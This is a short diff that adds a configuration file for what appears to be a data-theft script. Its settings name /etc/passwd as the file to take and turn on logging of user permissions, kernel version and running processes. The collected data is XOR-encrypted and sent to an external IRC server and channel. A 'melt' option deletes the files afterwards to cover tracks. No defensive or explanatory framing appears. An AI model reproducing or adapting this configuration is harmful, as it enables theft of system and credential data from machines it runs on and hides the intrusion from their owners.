@@ -1,0 +1,11 @@
+file-name(s)=/etc/passwd #use comma to seperate file names
+file-log=true #true = will log, false = will not. if this value is empty, the script will take this as a false value
+user-perms=true #log the logged in user's current perms
+linux-ver=true #log the machine's Linux kernel version
+cur-dir=false #log the user's current directory
+logged-users=false #log the logged in users
+cur-process=true #log the current running processes
+xor-key=loldongs #xor secret key to use to encrypt tempfiles
+irc-server=hades.rdtx.eu #irc server to send encrypted paste to
+irc-channel=legion #irc channel to send encrypted paste to
+melt-switch=true #turning this value to true will delete the files once everything has been finished
